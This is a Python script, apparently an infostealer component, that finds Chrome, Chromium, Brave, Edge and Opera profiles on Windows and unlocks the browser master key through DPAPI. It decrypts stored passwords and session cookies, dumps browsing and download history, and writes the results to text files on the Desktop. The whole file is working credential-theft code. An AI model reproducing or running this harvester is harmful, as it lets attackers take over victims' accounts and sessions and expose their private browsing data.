import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta

from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData


# Ha a PowerShellből jön, használja, ha nincs, akkor a Desktop
output_base = os.path.join(os.path.expanduser("~"), "Desktop")
    
appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'edge': appdata + '\\Microsoft\\Edge\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return None
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # remove DPAPI prefix
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(buff: bytes, key: bytes) -> str:
    if not buff or len(buff) < 16:
        return ""
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode(errors='replace')
    except Exception as e:
        return f"[FAILED TO DECRYPT]"

def convert_chrome_time(chrome_time):
    if chrome_time == 0:
        return "0"
    try:
        return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
    except:
        return str(chrome_time)
        
def save_results(browser_name, type_of_data, content):
    browser_dir = os.path.join(output_base, browser_name)
    if not os.path.exists(browser_dir):
        os.makedirs(browser_dir)  # létrehozza az összes hiányzó mappát
    if content:
        with open(os.path.join(browser_dir, f"{type_of_data}.txt"), 'w', encoding="utf-8") as f:
            f.write(content)
        print(f"\t [*] Saved in {browser_dir}/{type_of_data}.txt")
    else:
        print(f"\t [-] No Data Found!")

def get_data(path: str, profile: str, key, type_of_data):
    db_file = os.path.join(path, profile + type_of_data["file"])
    if not os.path.exists(db_file):
        return ""
    try:
        shutil.copy(db_file, 'temp_db')
    except:
        print(f"\t [-] Can't access {type_of_data['file']}")
        return ""
    result = ""
    try:
        conn = sqlite3.connect('temp_db')
        cursor = conn.cursor()
        cursor.execute(type_of_data['query'])
        for row in cursor.fetchall():
            row = list(row)
            if type_of_data['decrypt']:
                for i in range(len(row)):
                    if isinstance(row[i], bytes) and row[i]:
                        row[i] = decrypt_password(row[i], key)
            if type_of_data['columns'][-1] == 'Visited Time' and len(row) >= 3:
                row[2] = convert_chrome_time(row[2])
            result += "\n".join(f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)) + "\n\n"
        conn.close()
    finally:
        if os.path.exists('temp_db'):
            os.remove('temp_db')
    return result

def installed_browsers():
    available = []
    for name, path in browsers.items():
        if os.path.exists(os.path.join(path, "Local State")):
            available.append(name)
    return available

if __name__ == '__main__':
    available_browsers = installed_browsers()
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        if not master_key:
            continue
        print(f"Getting Stored Details from {browser}")
        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_',' ').capitalize()}")
            profile = "Default"
            if browser in ['opera-gx']:  # example: browsers without Default profile
                profile = ""
            data = get_data(browser_path, profile, master_key, data_type)
            save_results(browser, data_type_name, data)
            print("\t------\n")
